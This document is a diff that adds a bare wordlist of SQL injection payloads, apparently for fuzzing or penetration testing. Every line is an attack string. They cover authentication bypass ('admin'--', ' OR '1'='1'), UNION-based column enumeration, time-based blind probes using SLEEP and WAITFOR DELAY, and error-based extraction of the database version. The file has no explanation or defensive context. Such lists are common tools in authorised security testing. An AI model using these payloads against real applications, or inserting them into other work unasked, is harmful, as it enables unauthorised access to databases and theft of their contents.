@@ -1,0 +1,29 @@
+# SQL Injection Payloads
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+1' ORDER BY 1--
+1' ORDER BY 10--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+') OR ('1'='1
+')) OR (('1'='1
+' AND 1=1--
+' AND 1=2--
+' HAVING 1=1--
+' GROUP BY 1--
+1; WAITFOR DELAY '0:0:5'--
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR ''='
+admin'--
+1' OR '1'='1'/*
+' UNION SELECT @@version--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
